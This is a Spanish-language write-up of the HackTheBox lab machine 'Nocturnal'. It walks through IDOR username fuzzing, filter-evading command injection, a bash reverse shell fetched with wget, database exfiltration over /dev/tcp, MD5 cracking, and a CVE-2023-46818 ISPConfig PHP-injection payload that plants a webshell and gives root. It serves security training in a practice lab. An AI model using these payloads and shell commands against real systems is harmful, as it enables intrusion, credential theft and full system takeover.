---
title: Nocturnal - Easy (HTB)
permalink: /Nocturnal-HTB-Writeup/
tags:
  - Userame
  - Fuzzing
  - Command
  - Injection
  - SQLite
  - Hash
  - Cracking
  - Local
  - Port
  - Forwarding
  - SSH
  - ISPConfig
  - CVE-2023-46818
categories:
  - writeup
  - hacking
  - hackthebox
  - hacking web
toc: true
toc_label: Topics
toc_sticky: true
sidebar:
  - main
seo_tittle: Nocturnal - Easy (HTB)
seo_description: Abusa de IDOR e inyección de comandos en un servicio web inseguro. Explota CVE-2023-46818 en ISPConfig para vencer Nocturnal.
excerpt: Abusa de IDOR e inyección de comandos en un servicio web inseguro. Explota CVE-2023-46818 en ISPConfig para vencer Nocturnal.
header:
  overlay_image: /assets/images/headers/nocturnal-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/nocturnal-hackthebox.jpg
---

![image-center](/assets/images/posts/nocturnal-hackthebox.png)
{: .align-center}

**Habilidades:** Insecure Direct Object Reference (IDOR), Command Injection, SQLite Database Analysis, Hash Cracking, SSH Local Port Forwarding, `ISPConfig` PHP Code Injection (CVE-2023-46818)
{: .notice--primary}

# Introducción

Nocturnal es una máquina Linux de dificultad `Easy` en HackTheBox que requiere vulnerar un sitio web a través IDOR, el cual nos permitirá obtener la sesión de otro usuario y una copia de los archivos de la web. El acceso inicial lo obtendremos mediante inyección de comandos en una solicitud HTTP en parámetros sin sanitizar, además debemos migrar a un usuario con el que podamos acceder por SSH. Una vez dentro, identificaremos y explotaremos el servicio ISPConfig que se ejecuta internamente, de esta forma podremos obtener privilegios elevados y vencer la máquina.
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 10.10.11.64
PING 10.10.11.64 (10.10.11.64) 56(84) bytes of data.
64 bytes from 10.10.11.64: icmp_seq=1 ttl=63 time=134 ms

--- 10.10.11.64 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 134.082/134.082/134.082/0.000 ms
~~~


## Nmap Scanning 

Haremos un escaneo para identificar puertos abiertos en la máquina víctima a través del protocolo TCP

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.64 -oG openPorts               
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-12 16:31 EDT
Nmap scan report for 10.10.11.64
Host is up (0.14s latency).
Not shown: 64773 closed tcp ports (reset), 760 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 47.47 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Haremos un segundo escaneo más exhaustivo a los puertos abiertos que hemos descubierto

~~~ bash
nmap -p 22,80 -sVC 10.10.11.64 -oN services 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-12 16:32 EDT
Nmap scan report for 10.10.11.64
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.05 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal

El servidor nos intenta redirigir a `nocturnal.htb`. Agregaremos este nombre de dominio al archivo `/etc/hosts` para poder visitar la web.
 

## Web Analysis

Antes de navegar a la web podemos escanear las tecnologías que el servidor pueda estar ejecutando

~~~ bash
whatweb http://nocturnal.htb       
http://nocturnal.htb [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[support@nocturnal.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.64], Title[Welcome to Nocturnal], nginx[1.18.0]
~~~

Vemos que se utiliza `nginx` en su versión `1.18.0`. Si visitamos la web veremos lo siguiente. Una web donde podremos subir archivos Word, PDF, y Excel

![image-center](/assets/images/posts/nocturnal-web-analysis.png)
{: .align-center}


El sitio nos deja registrar e iniciar sesión con una cuenta, en mi caso crearé una con el nombre `andrew`

![image-center](/assets/images/posts/nocturnal-web-analysis-2.png)
{: .align-center}


### (Posible) `.php` File Upload

Una vez iniciamos sesión, se nos redirige a `dashboard.php`, allí podremos subir archivos, en mi caso intentaré subir un archivo `.php` malicioso, pero la web nos indica el siguiente error

~~~ text
Invalid file type. pdf, doc, docx, xls, xlsx, odt are allowed. 
~~~

### `.pdf` File Upload

Al subir un archivo `.pdf` podemos visitarlo mediante la siguiente `url` donde se contemplan tanto el parámetro `username` para hacer referencia a un usuario y el parámetro `filename` donde se nombra el archivo

~~~ bash
http://nocturnal.htb/view.php?username=andrew&file=test.pdf
~~~


## Insecure Direct Object Reference (IDOR)

Podemos intentar hacer `fuzzing` mediante el parámetro `username` para descubrir nombres de usuario válidos

~~~ bash
wfuzz -c --hw 243 -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -b 'PHPSESSID=46d7mtkbhkovf744f2nrhqu6tk' 'http://nocturnal.htb/view.php?username=FUZZ&file=test.pdf'

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://nocturnal.htb/view.php?username=FUZZ&file=test.pdf
Total requests: 8295455

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000002:   200        128 L    247 W      3037 Ch     "admin"      
000000017:   200        177 L    470 W      5150 Ch     "andrew"
000000194:   200        128 L    248 W      3113 Ch     "amanda"
000002688:   200        128 L    247 W      3037 Ch     "tobias"
~~~

Hemos encontrado `3` nombres de usuario además de nosotros (`andrew`). Podemos intentar usar estos nombres de usuario para ver si accedemos a otros recursos.

Si intentamos con el usuario `amanda`, veremos lo siguiente

![image-center](/assets/images/posts/nocturnal-web-analysis-3.png)
{: .align-center}


Nos es posible descargar un archivo `privacy.odt`. Podemos abrirlo directamente con `LibreOffice` o descomprimir el archivo con el comando `unzip` y ver el contenido del documento en el archivo `xl/content.xml`

~~~ bash
curl -X POST -sL http://nocturnal.htb/view.php\?username\=amanda\&file\=privacy.odt -b 'PHPSESSID=46d7mtkbhkovf744f2nrhqu6tk' -o privacy.odt
~~~

El documento posee el siguiente mensaje, se nos señala una contraseña temporal que funciona para iniciar sesión como `amanda`

~~~ text
Dear Amanda,
Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure.
The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us.
Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter.

Yours sincerely,
Nocturnal's IT team
~~~

Una vez estamos en `dashboard.php` como el usuario `amanda`, podemos ver que tenemos acceso a un enlace `Admin Panel`

![image-center](/assets/images/posts/nocturnal-web-analysis-4.png)

Dentro de `Admin Panel` podremos ver el contenido de los archivos en la carpeta actual

![image-center](/assets/images/posts/nocturnal-web-analysis-5.png)
<br>


# Intrusión / Explotación
---
## Command Injection

En la sección del final podemos crear una copia de los recursos que vemos, además podemos agregar una contraseña.

Si prestamos atención en el archivo `admin.php`, vemos el comando utilizado para crear el `backup` en el código PHP implementado.

~~~ bash
$command = "zip -x './backups/*' -r -P " . $password . " " . $backupFile . " .  > " . $logFile . " 2>&1 &";
~~~

Si intentamos enviar caracteres para escapar del comando actual, el servidor indicará un error

> Request

~~~ bash
password=test;whoami&backup=
~~~


> Response

~~~ bash
<div class='error-message'>Error: Try another password.</div>
	</div>
~~~

Se intenta sanitizar el parámetro `password` eliminando ciertos caracteres como (`;`, `&`, `|` o ` `) con funciones como `, pero es posible escapar del comando con los siguientes caracteres 

- `\n -> %0a`
- `\t -> %09`

Podemos usar `%09` como una separación entre lo que indiquemos

~~~ bash
password=test%0acat%09/etc/passwd&backup=
~~~

Vemos que tiene `wget` instalado, podemos usar este comando para descargar recursos de un servidor HTTP controlado por nosotros

~~~ html
<h3>Output:</h3>
<pre>
	/usr/bin/wget
</pre>
~~~

Crearemos una reverse shell en bash y la guardaremos en un archivo malicioso, por ejemplo 
`rev.sh`

~~~ bash
bash -c 'bash -i >& /dev/tcp/10.10.14.237/4444 0>&1'
~~~

Antes de solicitar este recurso, necesitaremos iniciar un servidor HTTP con `python` en nuestra máquina atacante

~~~ bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
~~~

Ahora procedemos a descargar la reverse shell en la máquina víctima utilizando el comando `wget`

~~~
password=test%0awget%09http://10.10.14.237/rev.sh&backup=
~~~

Habremos recibido la solicitud HTTP al recurso `rev.sh`

~~~ bash
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.64 - - [12/May/2025 18:38:27] "GET /rev.sh HTTP/1.1" 200 -
~~~


## Shell as `www-data`

Ahora la ejecutamos con `bash`, recuerda iniciar un listener con `netcat` por un puerto, en mi caso el `4444`

~~~ bash
password=test%0abash%09rev.sh&backup=
~~~

En mi caso, he configurado la conexión hacia mi puerto `4444`, al momento de enviar la solicitud maliciosa, habremos recibido la conexión

~~~ bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.237] from (UNKNOWN) [10.10.11.64] 52092
bash: cannot set terminal process group (874): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nocturnal:~/nocturnal.htb$ hostname -I
hostname -I
10.10.11.64
~~~


## TTY Treatment

Haremos un tratamiento de la `tty` para poder operar con una consola más interactiva

~~~ bash
www-data@nocturnal:~/nocturnal.htb$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@nocturnal:~/nocturnal.htb$ ^Z
[1]  + 112843 suspended  nc -lvnp 4444
root@parrot exploits # stty raw -echo; fg 
[1]  + 112843 continued  nc -lvnp 4444
                                      reset xterm
~~~

Para finalizar el tratamiento, asignaremos un valor a la variable de entorno `TERM` para poder limpiar la pantalla con `Ctrl + L`. Además ajustaremos las proporciones de la terminal

~~~ bash
www-data@nocturnal:~/nocturnal.htb$ export TERM=xterm
www-data@nocturnal:~/nocturnal.htb$ stty rows 44 columns 184
~~~


## System Enumeration

Ahora haremos una enumeración básica del sistema donde buscaremos vías potenciales mediante las cuales podamos escalar privilegios

~~~ bash
www-data@nocturnal:~/nocturnal.htb$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
tobias:x:1000:1000:tobias:/home/tobias:/bin/bash
ispapps:x:1001:1002::/var/www/apps:/bin/sh
ispconfig:x:1002:1003::/usr/local/ispconfig:/bin/sh
~~~


## SQLite Database Analysis

Encontraremos un directorio `nocturnal_database`, si listamos lo que hay dentro, veremos que existe un archivo `nocturnal_database.db` que es un archivo compatible con `sqlite3`

~~~ bash
www-data@nocturnal:~$ ls
html  ispconfig  nocturnal.htb	nocturnal_database  php-fcgi-scripts
www-data@nocturnal:~$ cd nocturnal_database/
www-data@nocturnal:~/nocturnal_database$ ls
nocturnal_database.db
www-data@nocturnal:~/nocturnal_database$ file nocturnal_database.db 
nocturnal_database.db: SQLite 3.x database, last written using SQLite version 3031001
~~~

### File Transfer

El sistema tiene instalado `netcat`, la cual es una herramienta que perfectamente podemos usar para transferir este archivo a nuestra máquina. Alternativamente, podemos utilizar un socket con la ruta `/dev/tcp` para enviarnos el archivo con una conexión TCP

Primeramente iniciaremos un listener en nuestra máquina eligiendo un puerto que no esté siendo utilizado por otro servicio

~~~ bash
nc -lvnp 4444 > nocturnal.db
listening on [any] 4444 ...
~~~

Desde la máquina víctima ejecutaremos el siguiente comando, esto abrirá una conexión TCP hacia nuestra máquina atacante enviando el contenido del archivo `nocturnal_database.db`

~~~ bash
www-data@nocturnal:~/nocturnal_database$ cat nocturnal_database.db > /dev/tcp/10.10.14.237/4444
~~~

Inmediatamente recibiremos el archivo desde nuestro listener

~~~ bash
nc -lvnp 4444 > nocturnal.db
listening on [any] 4444 ...
connect to [10.10.14.237] from (UNKNOWN) [10.10.11.64] 59250
~~~

### (Tip) Verify File Integrity 

Podemos verificar la integridad del archivo transferido calculando el `hash` MD5 resultante del mismo. Ambos deben ser idénticos, de lo contrario, sabremos que el archivo está corrupto

~~~ bash
www-data@nocturnal:~/nocturnal.htb$ md5sum ../nocturnal_database/nocturnal_database.db 
293b34c7f9cdf00d223c9c83dbeba990  ../nocturnal_database/nocturnal_database.db
~~~

Ejecutaremos `sqlite` pasando como argumento el nombre del archivo y en mi caso quiero ver los datos en formato tabla, eso lo especifico con el parámetro `-table`

~~~ bash
sqlite3 nocturnal.db -table

SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite>
sqlite> .tables
uploads  users  
sqlite> select * from users;
+----+----------+----------------------------------+
| id | username |             password             |
+----+----------+----------------------------------+
| 1  | admin    | d725aeba143f575736b07e045d8ceebb |
| 2  | amanda   | df8b20aa0c935023f99ea58358fb63c4 |
| 4  | tobias   | 55c82b1ccd55ab219b3b109b07d5061d |
| 8  | andrew   | 32250170a0dca92d53ec9624f336ca24 |
+----+----------+----------------------------------+
~~~

Vemos una tabla `users`, y dentro de ella vemos el registro de usuarios, con datos como su `username` y su contraseña en formato `hash`. 

Como ya sabemos que `tobias` es un usuario válido en el sistema, usaremos su hash. Pero primeramente identificaremos el algoritmo

~~~ bash
hashid 55c82b1ccd55ab219b3b109b07d5061d                                
Analyzing '55c82b1ccd55ab219b3b109b07d5061d'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 
~~~


## Hash Cracking

Guardaremos el hash en un archivo y lo intentaremos crackear con `john`, debemos especificar el formato para que `john` pueda crackearlo

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
slowmotionapocalypse (?)     
1g 0:00:00:00 DONE (2025-05-12 18:58) 5.000g/s 18468Kp/s 18468Kc/s 18468KC/s slp312..slow86
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
~~~

Utilizaremos esta contraseña para autenticarnos por el protocolo `ssh` en la máquina víctima

~~~ bash
ssh tobias@nocturnal.htb     
tobias@10.10.11.64\'s password: 
...
Last login: Mon May 12 22:59:18 2025 from 10.10.14.169
tobias@nocturnal:~$ 
~~~

Asignaremos el valor a la variable `TERM` para poder limpiar la pantalla con `Ctrl + L`

~~~ bash
tobias@nocturnal:~$ export TERM=xterm
~~~

En este punto ya podemos ver la flag del usuario sin privilegios

~~~ bash
tobias@nocturnal:~$ cat user.txt
ad5...
~~~
<br>


# Escalada de Privilegios
---
## Internally Open Ports

Una vez estamos dentro de la máquina víctima como el usuario  `tobias`, podemos ejecutar el comando `ss` para listar los puertos abiertos. Nuestro objetivo será identificar servicios que solamente estén disponibles para la máquina, o sea, que el puerto esté en la dirección `127.0.0.1`, también conocido como `localhost`

~~~ bash
tobias@nocturnal:~$ ss -tunl | grep 127.0.0.1
tcp    LISTEN  0       70           127.0.0.1:33060        0.0.0.0:*            
tcp    LISTEN  0       151          127.0.0.1:3306         0.0.0.0:*            
tcp    LISTEN  0       10           127.0.0.1:587          0.0.0.0:*            
tcp    LISTEN  0       4096         127.0.0.1:8080         0.0.0.0:*            
tcp    LISTEN  0       10           127.0.0.1:25           0.0.0.0:*
~~~

En este caso veremos que hay unos cuantos servicios accesibles solamente desde la máquina


## SSH Local Port Forwarding

Haremos que el puerto `8080` sea alcanzable por nuestra máquina atacante a través de un reenvío de puertos con `ssh`

~~~ bash
ssh -L 8080:127.0.0.1:8080 -fN tobias@10.10.11.64

# Comprobamos que hayamos abierto el puerto `8080`
ss -tunl | grep 8080                             
tcp   LISTEN 0      128        127.0.0.1:8080       0.0.0.0:*   
tcp   LISTEN 0      128            [::1]:8080          [::]:* 
~~~

- `-L`: Reenviar un puerto local
- `-f`: Ejecutar en segundo plano
- `-N`: No iniciar una consola


## Web Analysis - `ISPConfig`

Si navegamos hasta el puerto `8080` en `localhost` veremos una web que corresponde a `ISPConfig`

> ISPConfig es un **panel de control de hosting de código abierto para Linux**. Es una herramienta que facilita la gestión de servidores, web hosting, revendedores y clientes.
{: .notice--info}

![image-center](/assets/images/posts/nocturnal-ispconfig.png)
{: .align-center}

Si intentamos ingresar con las credenciales que disponemos, lograremos iniciar sesión con las siguientes

~~~ bash
admin:slowmotionapocalypse
~~~

Entraremos al panel de control, veremos muchas opciones para explorar

![image-center](/assets/images/posts/nocturnal-ispconfig-2.png)
{: .align-center}

En la sección de ayuda podremos ver la versión de `ISPConfig`

~~~ bash
ISPConfig Version: 3.2.10p1
~~~


## ISPConfig < 3.2.11p PHP Code Injection (CVE-2023-46818)

Esta versión de `ISPConfig` es vulnerable a inyección de código PHP, permitiendo a un atacante inyectar código en el editor de archivos de idioma cuando `admin_allow_langedit` está habilitado.

### Understanding Attack

La vulnerabilidad surge cuando `/admin/language_edit.php` no sanitiza el contenido del parámetro `records` en una solicitud POST. A continuación podemos ver una solicitud HTTP maliciosa

~~~ http
POST /admin/language_edit.php HTTP/1.1
Host: localhost:8081
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Cookie: ISPCSESS=f5lhhlgmdq9nl7e57c2c2djmn5
Content-Length: 357
Content-Type: application/x-www-form-urlencoded


lang=en&module=help&lang_file=osyyeuxs.lng&_csrf_id=language_edit_399d4a0322ba2ac1217d45ba&_csrf_key=20034670f4e09f84940295d767d88003dd543b45&records%5B%5C%5D=%27%5D%3Bfile_put_contents%28%27sh.php%27%2Cbase64_decode%28%27PD9waHAgcHJpbnQoJ19fX18nKTsgcGFzc3RocnUoYmFzZTY0X2RlY29kZSgkX1NFUlZFUlsnSFRUUF9DJ10pKTsgcHJpbnQoJ19fX18nKTsgPz4%3D%27%29%29%3Bdie%3B%23
~~~

En este caso enviamos un payload a través del parámetro `records`, donde la cadena decodificada se vería se la siguiente forma

~~~ bash
'];file_put_contents('sh.php',base64_decode('PD9waHAgcHJpbnQoJ19fX18nKTsgcGFzc3RocnUoYmFzZTY0X2RlY29kZSgkX1NFUlZFUlsnSFRUUF9DJ10pKTsgcHJpbnQoJ19fX18nKTsgPz4='));die;#
~~~

Esto crea un archivo `php` malicioso con el siguiente contenido

~~~ php
<?php print('____'); passthru(base64_decode($_SERVER['HTTP_C'])); print('____'); ?>
~~~

Esto recibe una cabecera `C` que es enviada en `base64` y ejecuta su contenido, actuando como una `webshell`. 

La siguiente solicitud representa un envío de un comando a este archivo `sh.php`

~~~ http
GET /admin/sh.php HTTP/1.1
Host: localhost:8081
User-Agent: python-requests/2.32.3
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
C: YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMzcvNDQ0NCAwPiYxJw==
Cookie: ISPCSESS=f5lhhlgmdq9nl7e57c2c2djmn5
~~~

En la cabecera `C` estaríamos enviando nuestro comando que decodificado desde `base64` podría verse de la siguiente manera para ejecutar una reverse shell

~~~ bash
bash -c 'bash -i >& /dev/tcp/10.10.14.237/4444 0>&1'
~~~

### Exploiting

Clonaremos el repositorio de [Github](https://github.com/ajdumanhug/CVE-2023-46818) para llevar a cabo la explotación de esta vulnerabilidad

~~~ bash
git clone https://github.com/ajdumanhug/CVE-2023-46818
cd CVE-2023-46818
~~~

Modificaremos el exploit para enviar un comando que envíe una shell directamente a nuestra máquina

~~~ bash
cmd = "bash -c 'bash -i >& /dev/tcp/10.10.14.237/4444 0>&1'"
~~~


## Root Time

Ejecutaremos el payload modificado para enviar directamente una shell a nuestra máquina atacante por un puerto que seleccionemos

~~~ bash
python3 exploit.py http://localhost:8081 admin slowmotionapocalypse
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Login successful!
[+] Fetching CSRF tokens...
[+] CSRF ID: language_edit_314c9e6f2e07c628dd2845ae
[+] CSRF Key: aa2250eafc3095a40adf91f1a7e747bf5aa7aa4f
[+] Injecting shell payload...
[+] Shell written to: http://localhost:8080/admin/sh.php
[+] Launching shell...
~~~

Y desde nuestro listener habremos recibido la shell como `root`

~~~ bash
nc -lvnp 4444               
listening on [any] 4444 ...
connect to [10.10.14.237] from (UNKNOWN) [10.10.11.64] 33164
bash: cannot set terminal process group (830): Inappropriate ioctl for device
bash: no job control in this shell
root@nocturnal:/usr/local/ispconfig/interface/web/admin# id
uid=0(root) gid=0(root) groups=0(root) 
~~~


## TTY Treatment

Finalmente haremos el último tratamiento de la `tty` para hacer más interactiva la consola que obtuvimos

~~~ bash
root@nocturnal:/usr/local/ispconfig/interface/web/admin# script /dev/null -c bash
<onfig/interface/web/admin# script /dev/null -c bash     
Script started, file is /dev/null
root@nocturnal:/usr/local/ispconfig/interface/web/admin# ^Z
[1]  + 58764 suspended  nc -lvnp 4444
root@parrot nocturnal # stty raw -echo; fg                             
[1]  + 58764 continued  nc -lvnp 4444
                                     reset xterm
                             root@nocturnal:/usr/local/ispconfig/interface/web/admin# export TERM=xterm
root@nocturnal:/usr/local/ispconfig/interface/web/admin# stty rows 44 columns 184
~~~

Ahora ya podemos ver la flag ubicada en el directorio `/root`

~~~ bash
root@nocturnal:/usr/local/ispconfig/interface/web/admin# cat /root/root.txt
99e...
~~~

Gracias por leer hasta el final, a continuación te dejo la cita del día...
<br>
> Ambition is but avarice on stilts, and masked.
> — Walter Savage Landor
{: .notice--info}